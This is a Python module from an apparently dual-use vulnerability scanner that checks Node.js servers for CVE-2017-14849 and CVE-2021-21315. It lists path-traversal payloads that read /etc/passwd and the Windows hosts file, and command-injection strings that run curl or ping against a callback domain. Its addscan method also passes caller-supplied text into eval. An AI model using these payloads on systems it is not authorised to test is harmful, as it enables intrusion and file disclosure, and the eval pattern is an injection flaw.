#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Joyent Node.js是美国Joyent公司的一套建立在Google V8 JavaScript引擎之上的网络应用平台
    Nodejs扫描类: 
        1. Node.js 目录穿越
            CVE-2017-14849
                Payload: https://vulhub.org/#/environments/node/CVE-2017-14849/

        2. Node.js 命令执行
            CVE-2021-21315
                Payload: https://blog.csdn.net/weixin_47179815/article/details/125799014

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Nodejs.cve_2017_14849 import cve_2017_14849_scan
from payloads.Nodejs.cve_2021_21315 import cve_2021_21315_scan

class Nodejs():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Node.js'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2017_14849_payloads = [
            {
                'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': ''
            },
            {
                'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': ''
            },
            {
                'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\\Windows\\System32\\drivers\\etc\\hosts',
                'data': ''
            }
        ]
        
        self.cve_2021_21315_payloads = [
            {
                'path': 'api/getServices?name[]=$(curl DNSdomain)',
                'data': ''
            },
            {
                'path': 'api/getServices?name[]=$(ping -c 4 DNSdomain)',
                'data': ''
            },
            {
                'path': 'api/getServices?name[]=$(ping DNSdomain)',
                'data': ''
            },
            {
                'path': 'getServices?name[]=$(curl DNSdomain)',
                'data': ''
            },
            {
                'path': 'getServices?name[]=$(ping -c 4 DNSdomain)',
                'data': ''
            },
            {
                'path': 'getServices?name[]=$(ping DNSdomain)',
                'data': ''
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_14849_scan, url=url),
            thread(target=self.cve_2021_21315_scan, url=url)
        ]

Nodejs.cve_2017_14849_scan = cve_2017_14849_scan
Nodejs.cve_2021_21315_scan = cve_2021_21315_scan

nodejs = Nodejs()
